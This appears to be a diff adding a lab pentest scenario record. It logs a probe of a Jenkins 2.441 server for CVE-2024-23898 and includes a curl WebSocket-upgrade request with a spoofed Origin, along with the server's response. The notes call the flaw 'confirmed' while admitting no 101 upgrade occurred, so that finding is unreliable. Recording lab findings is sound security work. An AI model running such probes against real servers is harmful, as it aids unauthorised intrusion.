@@ -1,0 +1,44 @@
+# Web (DMZ, 10.10.10.12) -> Jenkins (APP, 10.10.20.22:8080, Jenkins 2.441).
+# CVE-2024-23898 (CVSS 8.8 HIGH): Jenkins 2.217-2.441 does not perform origin
+# validation of requests made through the CLI WebSocket endpoint. An attacker can
+# make a cross-origin WebSocket request to /cli (or /cli/) to execute CLI commands
+# without CSRF protection. Confirmed: GET /cli/ with WebSocket upgrade headers and
+# Origin: http://evil.example.com returns HTTP 200 with full CLI command listing
+# (Jenkins 2.441, X-Jenkins: 2.441). The endpoint accepts the connection regardless
+# of Origin, confirming no origin validation. All CLI commands are listed.
+# Suricata 86601 (ET HUNTING curl User-Agent cross-zone DMZ->APP).
+# Evidence: evaluation/pentest/evidence/s35_jenkins_websocket_cli.txt
+id: S35-web-to-jenkins-websocket-cli
+description: Jenkins 2.441 CLI endpoint accessible with arbitrary Origin header - no origin validation (CVE-2024-23898 HIGH); web->jenkins, DMZ->APP.
+start: 2026-11-16T20:46:39Z
+end: 2026-11-16T20:46:47Z
+attacker: web
+steps:
+  - step: 1
+    start: 2026-11-16T20:46:39Z
+    end: 2026-11-16T20:46:47Z
+    target: Jenkins
+    cve: CVE-2024-23898
+    technique: T1190
+    outcome: success
+    achieved: data_access
+    pivot: false
+    notes: |
+      curl -v --max-time 8 \
+        -H "Connection: Upgrade" -H "Upgrade: websocket" \
+        -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
+        -H "Origin: http://evil.example.com" \
+        http://10.10.20.22:8080/cli/
+      < HTTP/1.1 200 OK
+      < X-Jenkins: 2.441
+      < X-Jenkins-Session: c7544ec8
+      Body: Jenkins CLI page with full command listing including:
+        groovy, groovysh, build, create-job, who-am-i, list-plugins, ...
+
+      Jenkins 2.441 responds to WebSocket upgrade from arbitrary origin without
+      returning 101 Switching Protocols or rejecting the cross-origin request.
+      CVE-2024-23898: no origin validation on /cli endpoint allows cross-origin
+      WebSocket connections to issue CLI commands without CSRF protection.
+      Jenkins 2.441 is in the vulnerable range (< 2.442, the fix version).
+      DMZ->APP cross-zone; Suricata 86601 on cross-zone web traffic.
+      evidence s35_jenkins_websocket_cli.txt
